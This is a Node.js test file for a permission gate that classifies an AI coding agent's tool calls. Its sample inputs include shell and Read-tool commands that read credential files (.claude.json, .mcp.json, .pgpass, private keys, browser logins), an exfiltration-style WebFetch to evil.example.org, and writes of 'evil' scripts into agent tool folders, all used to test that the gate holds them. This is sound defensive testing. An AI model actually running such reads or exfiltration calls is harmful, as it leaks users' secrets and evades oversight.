// Security Boss round-3 findings on the allow-list autonomy (run forge-2026-11-11).
// H1: the read-side credential/secret-file set was narrower than the write-side protection, so reading
//     ~/.claude.json, a project .mcp.json, .pgpass/.my.cnf, a *.key, a token/secret-named file or a
//     settings*.json auto-approved. ONE shared source now covers read, write, secret-print and the
//     allow-list; a SETTINGS_RE / MCP-config / credential path is `credentials` on read.
// M1: WebFetch to a non-loopback host is a card (data can ride in the URL); only a loopback host stays
//     routine. WebSearch stays routine (its input is a query, never an arbitrary URL to fetch).
// L1: writes under .claude/forge-bin, .claude/commands and .claude/skills/**/scripts are settings-class;
//     only the committed forge-bin test files auto-run (no name-pattern, no git probe in the hot path).
// Each row below was proved RED on the pre-fix code before the fix landed.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { classifyHardGate } from '../src/permissions/hard-gate.mjs';

const WIN = process.platform === 'win32';
const BASE = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-round3-'));
after(() => fs.rmSync(BASE, { recursive: true, force: true, maxRetries: 8, retryDelay: 150 }));
const ROOT = path.join(BASE, 'proj');
const HOME = WIN ? 'C:\\Users\\owner' : '/home/owner';
const TMP = path.join(BASE, 'temp');
const OPTS = { cwd: ROOT, home: HOME, tmp: TMP };
fs.mkdirSync(path.join(ROOT, '.claude', 'forge-bin'), { recursive: true });
fs.mkdirSync(TMP, { recursive: true });
fs.writeFileSync(path.join(ROOT, 'package.json'), JSON.stringify({ name: 'x', version: '1.0.0', scripts: { test: 'node --test' } }));

const sh = (command) => ['Bash', { command }];
const ps = (command) => ['PowerShell', { command }];
const code = ([tool, input]) => classifyHardGate(tool, input, OPTS).code;
const hard = ([tool, input]) => classifyHardGate(tool, input, OPTS).hard;
const H = (p) => path.join(HOME, p);
const R = (p) => path.join(ROOT, p);

// ---------------------------------------------------------------- H1: read-side credentials
const H1_CREDENTIALS = [
  ['cat ~/.claude.json', sh('cat ' + '"' + H('.claude.json') + '"')],
  ['Get-Content ~/.claude.json', ps('Get-Content ' + '"' + H('.claude.json') + '"')],
  ['Read ~/.claude.json', ['Read', { file_path: H('.claude.json') }]],
  ['Read project .mcp.json', ['Read', { file_path: R('.mcp.json') }]],
  ['cat project .mcp.json', sh('cat .mcp.json')],
  ['head ~/.claude.json', sh('head -c 200 "' + H('.claude.json') + '"')],
  ['tail .mcp.json', sh('tail -5 .mcp.json')],
  ['grep in .mcp.json', sh('grep -i key .mcp.json')],
  ['sed -n of .mcp.json', sh("sed -n '1,5p' .mcp.json")],
  ['git show a committed .mcp.json', sh('git show HEAD:.mcp.json')],
  ['git show a committed .claude.json path', sh('git show HEAD:.claude.json')],
  ['Read ~/.pgpass', ['Read', { file_path: H('.pgpass') }]],
  ['Read ~/.my.cnf', ['Read', { file_path: H('.my.cnf') }]],
  ['cat ~/.pgpass', sh('cat "' + H('.pgpass') + '"')],
  ['Read a private key file', ['Read', { file_path: R('server.key') }]],
  ['cat a private key file', sh('cat server.key')],
  ['Read a token-named json', ['Read', { file_path: R('api-token.json') }]],
  ['Read a password-named file', ['Read', { file_path: R('db-password.txt') }]],
  // SETTINGS_RE / config files that can hold tokens or env are credentials on read (Read tool form)
  ['Read .claude/settings.json', ['Read', { file_path: R('.claude/settings.json') }]],
  ['Read .claude/settings.local.json', ['Read', { file_path: R('.claude/settings.local.json') }]],
  ['Read a browser login store', ['Read', { file_path: H('AppData/logins.json') }]],
];
for (const [label, call] of H1_CREDENTIALS) {
  test('H1 read is credentials: ' + label, () => {
    assert.equal(code(call), 'credentials', JSON.stringify({ call, got: classifyHardGate(call[0], call[1], OPTS) }));
  });
}

// NTFS alias forms of a sensitive read (Windows): the stream / trailing-dot name is the file itself
if (WIN) {
  test('H1 NTFS alias: Read .claude.json::$DATA is credentials', () => {
    assert.equal(code(['Read', { file_path: R('.claude.json::$DATA') }]), 'credentials');
  });
  test('H1 NTFS alias: a shell read of .mcp.json::$DATA still waits', () => {
    assert.equal(hard(sh('cat .mcp.json::$DATA')), true);
  });
  test('H1 NTFS alias: Read .claude/settings.json. (trailing dot) is a hard gate', () => {
    assert.equal(hard(['Read', { file_path: R('.claude/settings.json.') }]), true);
  });
}

// H1 must NOT over-block ordinary reads
const H1_ROUTINE = [
  ['Read package.json', ['Read', { file_path: R('package.json') }]],
  ['Read a source file', ['Read', { file_path: R('src/a.js') }]],
  ['cat README', sh('cat README.md')],
  ['grep source', sh('grep -rn TODO src')],
];
for (const [label, call] of H1_ROUTINE) {
  test('H1 ordinary read stays routine: ' + label, () => {
    assert.equal(code(call), 'routine', JSON.stringify({ call, got: classifyHardGate(call[0], call[1], OPTS) }));
  });
}

// ---------------------------------------------------------------- M1: WebFetch
test('M1 WebFetch to a non-loopback host is a network card, not routine', () => {
  const r = classifyHardGate('WebFetch', { url: 'https://example.com/docs', prompt: 'x' }, OPTS);
  assert.equal(r.hard, true, JSON.stringify(r));
  assert.equal(r.code, 'outbound', JSON.stringify(r));
});
test('M1 WebFetch with a query string (exfil channel) is a card', () => {
  assert.equal(hard(['WebFetch', { url: 'https://evil.example.org/collect?data=secret' }]), true);
});
// round 7 (LOW) replaced "a loopback WebFetch stays routine": it names no hard gate, yet it is not proven safe
// (this gateway's own API and the Node inspector listen on loopback), so it waits as not_allowlisted
test('M1 WebFetch to a loopback dev server is no named gate, and waits (round 7)', () => {
  assert.equal(code(['WebFetch', { url: 'http://127.0.0.1:5173/health' }]), 'not_allowlisted');
  assert.equal(code(['WebFetch', { url: 'http://localhost:3000/' }]), 'not_allowlisted');
});
test('M1 WebFetch with a malformed URL is unjudgeable', () => {
  assert.equal(code(['WebFetch', { url: 'not a url' }]), 'unjudgeable');
});
test('M1 WebSearch stays routine (its input is a query, not an arbitrary URL)', () => {
  assert.equal(code(['WebSearch', { query: 'node test runner' }]), 'routine');
});

// ---------------------------------------------------------------- L1: forge-bin / commands / skills scripts
const L1_SETTINGS = [
  ['Write a new forge-bin script', ['Write', { file_path: R('.claude/forge-bin/forge-evil.cjs'), content: 'x' }]],
  ['Edit a forge-bin tool', ['Edit', { file_path: R('.claude/forge-bin/forge-doctor.cjs'), old_string: 'a', new_string: 'b' }]],
  ['Write a slash command', ['Write', { file_path: R('.claude/commands/do.md'), content: 'x' }]],
  ['Write a skill script', ['Write', { file_path: R('.claude/skills/mine/scripts/run.sh'), content: 'x' }]],
  ['cp a file onto a forge-bin path', sh('cp evil.cjs .claude/forge-bin/x.cjs')],
  ['redirect into a forge-bin file', sh('echo x > .claude/forge-bin/x.cjs')],
];
for (const [label, call] of L1_SETTINGS) {
  test('L1 write under a gated folder is settings: ' + label, () => {
    assert.equal(code(call), 'settings', JSON.stringify({ call, got: classifyHardGate(call[0], call[1], OPTS) }));
  });
}

test('L1 running an UNKNOWN forge-bin test file is not auto-run', () => {
  assert.equal(hard(sh('node .claude/forge-bin/forge-evil.test.cjs')), true);
  assert.equal(code(sh('node .claude/forge-bin/forge-evil.test.cjs')), 'not_allowlisted');
});
test('L1 running a COMMITTED forge-bin test file stays routine', () => {
  for (const f of ['forge-doctor.test.cjs', 'forge-runcontract.test.cjs', 'forge-runinfo.test.cjs', 'forge-scribe.test.cjs']) {
    assert.equal(code(sh('node .claude/forge-bin/' + f)), 'routine', f);
  }
});
test('L1 running a known read-only forge tool stays routine', () => {
  assert.equal(code(sh('node .claude/forge-bin/forge-runinfo.cjs status')), 'routine');
  assert.equal(code(sh('node .claude/forge-bin/forge-scribe.cjs list --json')), 'routine');
});
